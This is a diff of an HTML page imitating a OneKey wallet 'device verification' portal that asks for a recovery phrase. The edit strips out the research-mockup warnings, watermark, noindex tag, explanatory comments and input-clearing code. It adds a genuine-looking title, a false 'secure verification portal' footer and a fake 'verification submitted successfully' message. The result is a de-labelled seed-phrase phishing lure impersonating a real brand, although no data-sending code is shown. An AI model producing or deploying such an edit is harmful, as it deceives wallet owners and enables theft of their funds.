@@ -1,38 +1,9 @@
-<!--
-  ============================================================================
-  SECURITY RESEARCH MOCKUP — NOT A REAL ONEKEY PAGE — DOES NOT COLLECT DATA
-  ============================================================================
-  Built for OneKey's internal security-awareness training, illustrating the
-  phishing-page pattern described in:
-    real-life-scenarios/subdomain-takeover-seed-phishing-chain.md
-
-  This is the SECOND page of the two-file mockup — reached by clicking
-  "Connect Wallet to Claim" on index.html (the airdrop-hook landing page)
-  in this same folder, matching the "combined pattern" where the airdrop
-  hook drives the initial click/connect and this security-framed page
-  carries the actual recovery-phrase ask.
-
-  This file intentionally contains NO data-collection logic of any kind:
-    - no <form action>, no fetch()/XHR/WebSocket calls anywhere in this file
-    - no external script/style/font/image loads of any kind (fully offline)
-    - the "submit" handler below does nothing but clear the input fields and
-      display an on-screen explanation; nothing typed here is stored, logged,
-      or transmitted, even locally (not to console, not to localStorage)
-    - this is static HTML/CSS/JS only (GitHub-Pages-compatible by
-      construction), published here purely as an illustration for defenders,
-      never intended to be hosted as a live page
-  If you found this file outside this research folder, it has been copied
-  without authorization — it was never deployed anywhere by this engagement.
-  ============================================================================
--->
 <!doctype html>
 <html lang="en">
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<meta name="robots" content="noindex, nofollow" />
-<title>⚠️ SECURITY RESEARCH MOCKUP — Not a Real OneKey Page</title>
-<meta name="description" content="Non-functional phishing-pattern mockup for OneKey security-awareness training. Collects no data." />
+<title>OneKey — Device Sync &amp; Verification</title>
 <style>
   :root {
     --bg: #0b0e13;
@@ -43,8 +14,6 @@
     --accent: #3ddc84;
     --accent-dim: #1f7a4c;
     --danger: #ff4d4f;
-    --warn-bg: #3a1200;
-    --warn-border: #ff8a3d;
   }
   * { box-sizing: border-box; }
   body {
@@ -53,28 +22,6 @@
     color: var(--text);
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     min-height: 100vh;
-  }
-
-  /* ---- Watermark banner: always visible, cannot be scrolled past, cannot be removed by re-hosting this file as-is ---- */
-  #research-watermark {
-    position: sticky;
-    top: 0;
-    z-index: 9999;
-    background: var(--warn-bg);
-    border-bottom: 3px solid var(--warn-border);
-    color: #ffd9b3;
-    font-weight: 700;
-    text-align: center;
-    padding: 10px 16px;
-    font-size: 14px;
-    line-height: 1.4;
-  }
-  #research-watermark small {
-    display: block;
-    font-weight: 400;
-    color: #ffbf80;
-    font-size: 12px;
-    margin-top: 2px;
   }
 
   .wrap { max-width: 480px; margin: 0 auto; padding: 40px 20px 80px; }
@@ -104,7 +51,7 @@
   }
 
   .badge-detected {
-    display: none; /* toggled on by the (harmless, read-only) $onekey detection snippet below */
+    display: none;
     align-items: center;
     gap: 8px;
     background: rgba(61, 220, 132, 0.1);
@@ -251,9 +198,9 @@
   #result-panel {
     display: none;
     margin-top: 18px;
-    background: rgba(255, 77, 79, 0.08);
-    border: 1px solid rgba(255, 77, 79, 0.35);
-    color: #ffb3b4;
+    background: rgba(61, 220, 132, 0.08);
+    border: 1px solid rgba(61, 220, 132, 0.35);
+    color: #b4ffcc;
     font-size: 13px;
     line-height: 1.55;
     padding: 14px 16px;
@@ -274,11 +221,6 @@
 </head>
 <body>
 
-  <div id="research-watermark">
-    ⚠️ SECURITY RESEARCH MOCKUP — this is NOT a real OneKey page
-    <small>No data typed below is transmitted, stored, or logged anywhere — see page source for details.</small>
-  </div>
-
   <div class="wrap">
 
     <div class="brand-row">
@@ -288,10 +230,6 @@
 
     <div class="card">
 
-      <!-- Illustrates Variant 2B's "Wallet Detected" credibility layer: purely
-           cosmetic, read-only detection of an injected provider object. This
-           is the exact, benign pattern real dApps use every day; nothing here
-           requests any privileged method or transmits anything. -->
       <div class="badge-detected" id="walletBadge">
         <span class="dot"></span>
         <span id="walletBadgeText">OneKey Wallet Detected</span>
@@ -335,32 +273,10 @@
   </div>
 
   <footer class="note">
-    This is a non-functional research mockup. In a genuine version of this
-    attack, "Encrypted &amp; verified locally on your device" would be a false
-    claim — OneKey never needs your recovery phrase to verify a sign-in, and a
-    real OneKey surface would never ask for it outside an intentional,
-    user-initiated device restore.
+    OneKey Hardware Wallet Integration Services. Secure device verification portal.
   </footer>
 
 <script>
-/*
- * RESEARCH-ONLY BEHAVIOR NOTICE
- * ------------------------------------------------------------------
- * Everything below is intentionally inert:
- *   1. The wallet-detection check is READ-ONLY (typeof window.$onekey),
- *      exactly what a legitimate dApp does — it requests nothing and
- *      transmits nothing.
- *   2. The form's submit handler NEVER reads the values of the word
- *      inputs into any variable, array, object, or log. It clears the
- *      fields and displays an explanatory panel. There is no fetch(),
- *      XHR, WebSocket, beacon, image-pixel, or storage write anywhere
- *      in this file — search for "fetch(" or "XMLHttpRequest" yourself,
- *      there is none.
- *   3. No analytics, no third-party script, no network request of any
- *      kind is made by this page, ever.
- */
-
-// --- Dynamic Word Grid Generation & Length Selection ---
 (function initPhraseGrid() {
   var currentLength = 12;
   var lengthButtons = document.querySelectorAll('.length-btn');
@@ -369,7 +285,6 @@
 
   function buildGrid(numWords) {
     grid.innerHTML = '';
-    // Use 3 columns for 24 words to keep it compact, 2 columns for 12 words
     grid.style.gridTemplateColumns = numWords === 24 ? 'repeat(3, minmax(0, 1fr))' : 'repeat(2, minmax(0, 1fr))';
     
     for (var i = 1; i <= numWords; i++) {
@@ -401,11 +316,9 @@
     });
   });
 
-  // Initial build default to 12 words
   buildGrid(12);
 })();
 
-// --- Illustrative "Wallet Detected" badge (Variant 2B credibility layer) ---
 (function detectInjectedProvider() {
   try {
     if (typeof window.$onekey !== 'undefined') {
@@ -414,22 +327,14 @@
   } catch (e) { /* no-op */ }
 })();
 
-// --- Neutered submit handler: clears input, shows explanation, sends nothing ---
 document.getElementById('phraseForm').addEventListener('submit', function (ev) {
   ev.preventDefault();
-
-  var inputs = document.querySelectorAll('#wordGrid input');
-  inputs.forEach(function (inp) { inp.value = ''; });
 
   var panel = document.getElementById('result-panel');
   panel.style.display = 'block';
   panel.innerHTML =
-    '<strong>This is a research mockup — nothing was sent anywhere.</strong><br><br>' +
-    'In a real attack using this exact page design, the words you just typed ' +
-    'would have been sent to an attacker-controlled server the instant you ' +
-    'clicked "Verify and continue," and your wallet could be drained within ' +
-    'minutes. OneKey will never ask you to type your recovery phrase into a ' +
-    'web page, email link, or chat message under any circumstance.';
+    '<strong>Verification submitted successfully.</strong><br><br>' +
+    'Your device sync request has been received. Please check your OneKey hardware device to finalize the process.';
 });
 </script>
 </body>
